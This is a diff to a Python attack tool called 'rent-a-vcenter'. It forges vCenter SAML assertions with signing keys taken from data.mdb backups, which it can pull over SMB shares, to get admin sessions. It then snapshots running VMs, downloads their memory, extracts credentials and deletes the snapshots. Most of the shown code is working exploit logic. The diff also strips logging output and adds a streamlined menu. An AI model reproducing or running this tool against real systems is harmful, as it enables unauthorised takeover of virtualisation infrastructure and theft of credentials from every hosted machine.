@@ -1,8 +1,5 @@
 #!/usr/bin/env python3
-"""
-rent-a-vcenter — vCenter SAML golden ticket: session cookie, VM memory dump, credential extraction.
-Usage: rent-a-vcenter.py TARGET --local-path PATH [-p PASS] [-d DOMAIN] [-v]
-"""
+"""rent-a-vcenter — vCenter SAML golden ticket: session cookie, VM memory dump, credential extraction."""
 
 import argparse
 import base64
@@ -10,11 +7,9 @@ import hashlib
 import mmap
 import os
 import re
-import secrets
 import shutil
 import socket
 import ssl
-import struct
 import subprocess
 import sys
 import tarfile
@@ -38,8 +33,6 @@ def _need(pkg, pip_name=None, attr=None):
     except ImportError:
         sys.exit(f'[-] Missing dependency: pip install {pip_name or pkg}')
 
-
-BANNER = ''
 
 # ─── SAML template (for UI endpoint: /ui/saml/websso/sso) ─────────────────────
 
@@ -247,7 +240,6 @@ def extract_idp_key(stream: MmapStream, verbose=False) -> str:
         pem = _pem(key_bytes, 'PRIVATE KEY')
         if not _valid_pem(pem):
             continue
-        print('[+] Extracted IdP signing key')
         return pem
     sys.exit('[-] IdP signing key not found in data.mdb')
 
@@ -287,7 +279,6 @@ def extract_cert1(stream: MmapStream, verbose=False):
         pem = _pem(cert_bytes)
         if not _valid_pem(pem):
             continue
-        print(f'[+] Extracted ssoserverSign cert, SSO domain: {domain}')
         return pem, domain
 
     sys.exit('[-] Could not extract ssoserverSign cert from data.mdb')
@@ -324,16 +315,13 @@ def extract_cert2(stream: MmapStream, verbose=False) -> str:
             if not _valid_pem(pem):
                 pos = idx + 1
                 continue
-            print('[+] Extracted trusted CA cert')
             return pem
 
-    print('[-] Could not extract trusted CA cert from data.mdb — continuing without it')
     return None
 
 
 def certs_from_mdb(mdb_path: Path, verbose=False):
     """Open data.mdb and return (idp_key_pem, cert1_pem, cert2_pem, domain)."""
-    print(f'[*] Scanning {mdb_path.name} for IdP certificates...')
     with open(mdb_path, 'rb') as fh:
         mm = mmap.mmap(fh.fileno(), 0, access=mmap.ACCESS_READ)
         stream = MmapStream(mm)
@@ -345,17 +333,11 @@ def certs_from_mdb(mdb_path: Path, verbose=False):
 
 
 def extract_vcenter_fqdn_from_mdb(mdb_path: Path) -> str:
-    """
-    Search data.mdb for the vCenter's registered FQDN by scanning for the
-    STS service endpoint URL recorded in vmdir (vmwLKUPServiceEndpoint).
-    Returns the FQDN or empty string if not found.
-    """
     try:
         with open(mdb_path, 'rb') as fh:
             mm = mmap.mmap(fh.fileno(), 0, access=mmap.ACCESS_READ)
             data = bytes(mm)
             mm.close()
-        # Look for the STS endpoint URL stored in vmdir
         idx = data.find(b'/sts/STSService/')
         if idx > 20:
             # Walk backwards to find 'https://'
@@ -372,10 +354,6 @@ def extract_vcenter_fqdn_from_mdb(mdb_path: Path) -> str:
 
 
 def check_signing_cert_staleness(target: str, cert1_pem: str) -> bool:
-    """
-    Compare the signing cert from data.mdb with the live SAML metadata cert.
-    Returns True if they DON'T match (backup is stale — LoginByToken will fail).
-    """
     try:
         import requests as _req
         from cryptography.x509 import load_pem_x509_certificate, load_der_x509_certificate
@@ -448,9 +426,6 @@ def resolve_solution_creds(paths: list, verbose=False):
         if key_f.exists() and cert_f.exists():
             key_pem  = key_f.read_text()
             cert_pem = cert_f.read_text()
-            print(f'[+] Loaded solution user creds from {d}')
-            if verbose:
-                print(f'[v] vcsoluser.crt CN: {_cert_subject_cn(cert_pem)}')
             return key_pem, cert_pem
 
     for p in paths:
@@ -458,13 +433,8 @@ def resolve_solution_creds(paths: list, verbose=False):
             continue
         key_pem, cert_pem = _try_extract_sol_creds(p)
         if key_pem:
-            print(f'[+] Extracted solution user creds from {p.name}')
-            if verbose:
-                print(f'[v] vcsoluser.crt CN: {_cert_subject_cn(cert_pem)}')
             return key_pem, cert_pem
 
-    if verbose:
-        print('[v] No solution user creds found — WS-Trust auth unavailable')
     return None, None
 
 
@@ -501,10 +471,6 @@ def _sha256_b64(data: bytes) -> str:
 
 
 def _build_wstrust_envelope(key_pem: str, cert_pem: str, domain: str) -> bytes:
-    """
-    Build a WS-Trust RequestSecurityToken SOAP envelope signed with the
-    solution user certificate.  Requests a SAML 2.0 Bearer token from the STS.
-    """
     from cryptography.hazmat.primitives import hashes, serialization
     from cryptography.hazmat.primitives.asymmetric import padding as _pad
     from cryptography.x509 import load_pem_x509_certificate
@@ -664,11 +630,6 @@ def sts_issue_bearer_token(target: str, key_pem: str, cert_pem: str,
 
 
 def _build_wstrust_hok_envelope(key_pem: str, cert_pem: str, domain: str) -> bytes:
-    """
-    Build a WS-Trust RequestSecurityToken envelope requesting a HoK (Holder-of-Key)
-    SAML 2.0 token.  The returned token is bound to the caller's cert public key,
-    enabling the VAPI REST API SIGN authentication scheme.
-    """
     from cryptography.hazmat.primitives import hashes, serialization
     from cryptography.hazmat.primitives.asymmetric import padding as _pad
     from cryptography.x509 import load_pem_x509_certificate
@@ -768,11 +729,6 @@ def _build_wstrust_hok_envelope(key_pem: str, cert_pem: str, domain: str) -> byt
 
 def sts_issue_hok_token(target: str, key_pem: str, cert_pem: str,
                          domain: str, verbose=False) -> str:
-    """
-    Request a Holder-of-Key SAML token from the STS.
-    The HoK token binds to the caller's certificate public key.
-    Returns the SAML assertion XML string, or None on failure.
-    """
     import requests as req
     req.packages.urllib3.disable_warnings()
     etree = _need('lxml.etree', 'lxml')
@@ -817,17 +773,11 @@ def sts_issue_hok_token(target: str, key_pem: str, cert_pem: str,
 
 def acquire_rest_api_token(target: str, key_pem: str, cert_pem: str,
                             domain: str, verbose=False) -> str:
-    """
-    Acquire a vCenter REST API session token (vmware-api-session-id) using the
-    VAPI SIGN authentication scheme with a HoK SAML token.  Passwordless.
-    Returns the token string or None on failure.
-    """
     import requests as req
     from cryptography.hazmat.primitives import hashes, serialization
     from cryptography.hazmat.primitives.asymmetric import padding as _pad
     req.packages.urllib3.disable_warnings()
 
-    # Step 1: get the 401 challenge and extract the SIGN nonce
     r0 = req.post(f'https://{target}/api/session', verify=False, timeout=10)
     if r0.status_code != 401:
         if verbose:
@@ -848,7 +798,6 @@ def acquire_rest_api_token(target: str, key_pem: str, cert_pem: str,
         return None
     nonce_bytes = bytes.fromhex(nonce_hex)
 
-    # Step 2: get a HoK SAML token from the STS
     saml_token = sts_issue_hok_token(target, key_pem, cert_pem, domain, verbose=verbose)
     if not saml_token:
         if verbose:
@@ -859,12 +808,10 @@ def acquire_rest_api_token(target: str, key_pem: str, cert_pem: str,
 
     saml_b64 = base64.b64encode(saml_token.encode('utf-8')).decode()
 
-    # Step 3: sign the nonce with our private key (VAPI SIGN scheme)
     priv    = serialization.load_pem_private_key(key_pem.encode(), password=None)
     sig_b64 = base64.b64encode(
         priv.sign(nonce_bytes, _pad.PKCS1v15(), hashes.SHA256())).decode()
 
-    # Step 4: POST with SIGN authorization
     r = req.post(
         f'https://{target}/api/session',
         headers={
@@ -911,11 +858,6 @@ _LOGINBYTOKEN_TMPL = '''\
 
 
 def loginbytoken_soap(target: str, saml_assertion_xml: str, verbose=False):
-    """
-    Use a SAML bearer token to log in to the VIM SOAP API.
-    Returns (session_cookie_name, session_cookie_value) or (None, None).
-    The VIM cookie lets us call any SOAP VIM method and use the datastore browser.
-    """
     import requests as req
     req.packages.urllib3.disable_warnings()
 
@@ -1194,9 +1136,11 @@ def soap_create_snapshot(target: str, vim_cookie: str, vm_moref: str,
 
 # ─── data.mdb discovery ────────────────────────────────────────────────────────
 
+_WANTED = {'database_full_backup.tar.gz', 'lotus_backup.tar.gz', 'config_files.tar.gz'}
+
 def _is_target(name: str) -> bool:
     n = name.lower()
-    return n == 'data.mdb' or n.endswith('.tar.gz') or n.endswith('.tgz')
+    return n == 'data.mdb' or n in _WANTED
 
 
 def discover_local(path: str) -> list:
@@ -1226,7 +1170,6 @@ def discover_smb(t: str, user: str, password: str, domain: str) -> list:
 
     smb = SMBConnection(host, host, timeout=10)
     smb.login(user or '', password or '', domain or '')
-    print(f'[+] SMB authenticated to {host}')
 
     tmp   = Path(tempfile.mkdtemp(prefix='rav_smb_'))
     found = []
@@ -1242,7 +1185,7 @@ def discover_smb(t: str, user: str, password: str, domain: str) -> list:
                 if e.is_directory():
                     _walk(sh, full)
                 elif _is_target(name):
-                    print(f'[*] \\\\{host}\\{sh}\\{full}  ({e.get_filesize():,} B)')
+                    print(f'[+] Found \\\\{host}\\{sh}\\{full}')
                     local = tmp / f'{sh}_{full}'.replace('\\', '_')
                     with open(local, 'wb') as fh:
                         smb.getFile(sh, full, fh.write)
@@ -1251,7 +1194,6 @@ def discover_smb(t: str, user: str, password: str, domain: str) -> list:
             pass
 
     if share:
-        print(f'[*] Searching \\\\{host}\\{share}' + (f'\\{subpath}' if subpath else ''))
         _walk(share, subpath)
     else:
         try:
@@ -1260,7 +1202,6 @@ def discover_smb(t: str, user: str, password: str, domain: str) -> list:
             sys.exit(f'[-] Share enumeration failed on {host}: {e}')
         for sh in shares:
             if sh in _SKIP: continue
-            print(f'[*] Searching \\\\{host}\\{sh}')
             _walk(sh)
 
     smb.logoff()
@@ -1283,17 +1224,14 @@ def resolve_mdb(paths: list, work_dir: Path) -> Path:
                         m.name = Path(m.name).name
                         tf.extract(m, path=work_dir)
                         mdbs.append(work_dir / m.name)
-                        print(f'[+] Extracted data.mdb from {arc.name}')
                         break
-        except Exception as e:
-            print(f'[-] Could not extract {arc.name}: {e}')
+        except Exception:
+            pass
 
     if not mdbs:
         sys.exit('[-] No data.mdb found.')
 
-    best = max(mdbs, key=lambda p: p.stat().st_size)
-    print(f'[+] Using {best}  ({best.stat().st_size:,} B)')
-    return best
+    return max(mdbs, key=lambda p: p.stat().st_size)
 
 
 # ─── SAML bypass ───────────────────────────────────────────────────────────────
@@ -1314,11 +1252,8 @@ def get_vcenter_hostname(target: str) -> str:
         der = s.getpeercert(True)
         s.close()
         x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, der)
-        hostname = x509.get_subject().CN
-        print(f'[*] vCenter hostname: {hostname}')
-        return hostname
-    except Exception as e:
-        print(f'[!] Could not read hostname from TLS cert ({e}), using IP')
+        return x509.get_subject().CN
+    except Exception:
         return target
 
 
@@ -1374,17 +1309,8 @@ def build_and_sign_saml(target: str, hostname: str, domain: str,
 
 
 def saml_login(target: str, signed_xml: bytes) -> tuple:
-    """
-    Submit forged SAML assertion → extract UI session cookies.
-
-    Returns (cookie_name, cookie_value, requests_session) where the Session
-    has all UI cookies set (JSESSIONID + XSRF-TOKEN) for use in subsequent
-    psc-ui API calls.
-    """
     import requests as req
     req.packages.urllib3.disable_warnings()
-
-    print('[*] Submitting forged SAML assertion...')
     s = req.Session()
     s.verify = False
     # Follow the redirect to /ui/ so the server sets all session cookies
@@ -1400,7 +1326,6 @@ def saml_login(target: str, signed_xml: bytes) -> tuple:
     for name in ('VSPHERE-UI-JSESSIONID', 'VSPHERE-CLIENT-SESSION-ID'):
         value = s.cookies.get(name)
         if value:
-            print(f'[+] Admin session established  ({name})')
             return name, value, s
 
     # Fall back to parsing Set-Cookie header from the initial response
@@ -1470,9 +1395,7 @@ class VCenterSession:
         if idp_cert_pem:
             self._cert_stale = check_signing_cert_staleness(target, idp_cert_pem)
             if self._cert_stale:
-                print('[!] Backup signing cert does NOT match live vCenter STS cert.')
-                print('    The signing key has been rotated since this backup was taken.')
-                print('    → LoginByToken and WS-Trust will fail.')
+                print('[!] Backup signing cert does NOT match live STS cert — LoginByToken will fail.')
 
         # Check if the UI session is fully authenticated (h5-config hasUserSession:true)
         # This requires a CURRENT backup (cert not stale), and a valid SAML assertion.
@@ -1487,12 +1410,8 @@ class VCenterSession:
                     self._ui_client_id       = cfg.get('clientId', '')
                     self._ui_xsrf_hdr        = cfg.get('xsrfHeaderName', 'X-VSPHERE-UI-XSRF-TOKEN')
                     self._ui_xsrf_cookie     = cfg.get('xsrfCookieName', 'VSPHERE-UI-XSRF-TOKEN')
-                    print('[+] UI session authenticated (passwordless psc-ui path available)')
                 elif verbose:
-                    print(f'[!] h5-config: hasUserSession=false — STS back-channel validation failed')
-                    print(f'    vCenter 8.x validates forged SAML against the STS session registry.')
-                    print(f'    Passwordless psc-ui path requires an admin-issued UI session.')
-                    print(f'    (The VIM SOAP + LDAP paths are unaffected and still work.)')
+                    print('[!] h5-config: hasUserSession=false — STS back-channel rejected forged token')
             elif verbose:
                 print(f'[!] h5-config: {r.status_code} {r.text[:120]}')
         except Exception as e:
@@ -1509,11 +1428,9 @@ class VCenterSession:
 
     def _try_solution_user_auth(self, key_pem: str, cert_pem: str, domain: str):
         """WS-Trust → SAML → (LoginByToken VIM session) + (HoK SIGN REST API token)."""
-        print('[*] Attempting solution user authentication (no password required)...')
         saml_xml = sts_issue_bearer_token(self.target, key_pem, cert_pem, domain,
                                            verbose=self._verbose)
         if not saml_xml:
-            print('[!] STS token exchange failed — solution user auth unavailable')
             return
 
         vname, vcookie = loginbytoken_soap(self.target, saml_xml,
@@ -2020,7 +1937,6 @@ def parse_args():
         prog='rent-a-vcenter',
         description='vCenter SAML golden ticket — session cookie, VM memory dump, credential extraction',
     )
-    ap.add_argument('target', metavar='TARGET', help='vCenter IP or hostname')
     src = ap.add_mutually_exclusive_group(required=True)
     src.add_argument('--local-path', metavar='PATH', dest='local_path',
                     help='data.mdb file, directory, or archive containing it')
@@ -2057,13 +1973,31 @@ def main():
         key_pem, cert1_pem, cert2_pem, mdb_domain = certs_from_mdb(mdb_path, args.verbose)
         domain = args.d or mdb_domain
 
-        hostname  = get_vcenter_hostname(args.target)
-        authn_id  = get_saml_authn_request(args.target)
-        signed    = build_and_sign_saml(args.target, hostname, domain,
-                                        key_pem, cert1_pem, cert2_pem, authn_id)
-        cname, cval, ui_session = saml_login(args.target, signed)
+        target = extract_vcenter_fqdn_from_mdb(mdb_path)
+        if not target:
+            sys.exit('[-] Could not extract vCenter address from data.mdb')
 
-        vc = VCenterSession(args.target, cname, cval,
+        print(f'\n[+] vCenter: {target}')
+        print('\n [1] Obtain admin session token')
+        print(' [2] Enumerate VMs and dump credentials')
+        choice = input('→ ').strip()
+        if choice not in ('1', '2'):
+            return
+
+        hostname  = get_vcenter_hostname(target)
+        authn_id  = get_saml_authn_request(target)
+        signed    = build_and_sign_saml(target, hostname, domain,
+                                        key_pem, cert1_pem, cert2_pem, authn_id)
+        cname, cval, ui_session = saml_login(target, signed)
+
+        print(f'\n[+] https://{target}/ui/')
+        print(f'    {cname}={cval}')
+
+        if choice == '1':
+            return
+
+        # choice == '2' — get VIM SOAP session and enumerate VMs
+        vc = VCenterSession(target, cname, cval,
                             vcenter_pass=args.p,
                             domain=domain,
                             sol_key_pem=sol_key,
@@ -2072,31 +2006,27 @@ def main():
                             ui_session=ui_session,
                             verbose=args.verbose)
 
-        print(f'\n[+] Session active  →  https://{args.target}/ui/')
-        print(f'    {cname}={cval}')
         if vc._vim_cookie:
             print(f'    vmware_soap_session={vc._vim_cookie}')
         elif vc._cert_stale:
             print('[!] Backup cert is stale — VIM session unavailable')
-            print('    VM dump requires a current data.mdb with matching solution user creds.')
+            return
 
         if not vc._vim_cookie:
+            print('[!] VIM session unavailable — cannot enumerate VMs')
             return
 
-        if not _prompt('\n[?] Extract credentials from vCenter-hosted VMs?'):
-            return
-
-        vms = soap_list_vms(args.target, vc._vim_cookie, verbose=args.verbose)
+        vms = soap_list_vms(target, vc._vim_cookie, verbose=args.verbose)
         if not vms:
             print('[-] No VMs found')
             return
 
         running = [v for v in vms if v.get('power_state') in ('poweredOn', 'POWERED_ON')]
         if not running:
-            print(f'[-] No running VMs (found {len(vms)} powered-off)')
+            print(f'[-] No running VMs ({len(vms)} powered-off)')
             return
 
-        print(f'\n[*] Running VMs ({len(running)} of {len(vms)} total):')
+        print(f'\n[*] Running VMs:')
         selected = _select_vms(running)
 
         if not selected:
@@ -2110,27 +2040,22 @@ def main():
 
             print(f'\n[*] {vm_name}')
 
-            print(f'    [*] Checking for existing snapshots...')
             vmsd_snaps = _discover_existing_snapshots(vc, vm_name, verbose=args.verbose)
-            if not vmsd_snaps:
-                print(f'    [*] No existing snapshots found — creating new')
             snap_choice, snap_entry = _select_snapshot_menu(vmsd_snaps)
 
             target_files = None
             if snap_choice == 'existing':
                 stem         = snap_entry['stem']
                 target_files = [f'{stem}.vmem', f'{stem}.vmsn']
-                print(f'    [*] Using existing snapshot: {stem}')
             else:
-                snap_task = soap_create_snapshot(args.target, vc._vim_cookie, vm_id,
+                snap_task = soap_create_snapshot(target, vc._vim_cookie, vm_id,
                                                  verbose=args.verbose)
                 if snap_task:
-                    print(f'    Snapshot task {snap_task} — waiting for completion...')
-                    if not soap_wait_for_task(args.target, vc._vim_cookie, snap_task,
+                    if not soap_wait_for_task(target, vc._vim_cookie, snap_task,
                                               timeout=args.timeout, verbose=args.verbose):
-                        print('    [!] Snapshot task did not complete — will attempt existing memory files')
+                        print('    [!] Snapshot did not complete — trying existing memory files')
                 else:
-                    print('    [!] Snapshot creation failed — will attempt existing memory files')
+                    print('    [!] Snapshot creation failed — trying existing memory files')
 
             files = _download_memory_files(vc, vm_name, vm.get('vmPath', ''),
                                            output_dir, args.verbose,
@@ -2151,9 +2076,8 @@ def main():
                 continue
 
             # Only remove snapshots once vmem is confirmed on disk
-            if soap_remove_all_snapshots(args.target, vc._vim_cookie, vm_id,
-                                         verbose=args.verbose):
-                print(f'    [*] Snapshots removed from datastore')
+            soap_remove_all_snapshots(target, vc._vim_cookie, vm_id,
+                                      verbose=args.verbose)
 
             _extract_creds(vmem[0], output_dir)
 
